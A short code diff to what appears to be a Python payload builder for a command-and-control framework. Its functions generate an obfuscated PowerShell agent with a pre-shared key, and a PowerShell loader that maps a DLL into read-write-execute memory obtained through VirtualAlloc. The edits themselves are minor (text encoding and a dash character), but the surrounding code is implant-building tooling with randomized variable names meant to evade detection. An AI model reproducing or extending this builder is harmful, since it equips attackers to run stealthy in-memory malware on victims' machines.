@@ -422,7 +422,7 @@ if(${v['lnb']}-eq [IntPtr]::Zero){{
 {_d} "[DBG] Preferred base failed, trying any"
 ${v['lnb']}=${v['ltp']}[0]::VirtualAlloc([IntPtr]::Zero,[UIntPtr][uint64]${v['lsi']},0x3000,0x40)
 }}
-if(${v['lnb']}-eq [IntPtr]::Zero){{Write-Host "FATAL: VirtualAlloc failed — size=$(${v['lsi']})";return}}
+if(${v['lnb']}-eq [IntPtr]::Zero){{Write-Host "FATAL: VirtualAlloc failed - size=$(${v['lsi']})";return}}
 {_d} "[DBG] Allocated at 0x$(${v['lnb']}.ToString('X'))"
 
 # Copy headers
@@ -618,7 +618,7 @@ def build_powershell_agent(
     if output_path is None:
         output_path = Path('builds') / 'agent.ps1'
     output_path.parent.mkdir(parents=True, exist_ok=True)
-    output_path.write_text(script, encoding='utf-8')
+    output_path.write_text(script, encoding='utf-8-sig')
 
     # Save PSK alongside
     psk_path = output_path.with_suffix('.key')
@@ -713,7 +713,7 @@ def build_powershell_loader(
         output_path = Path('builds') / f'{Path(dll_path).stem}_loader.ps1'
     output_path = Path(output_path)
     output_path.parent.mkdir(parents=True, exist_ok=True)
-    output_path.write_text(script, encoding='utf-8')
+    output_path.write_text(script, encoding='utf-8-sig')
 
     return output_path
 
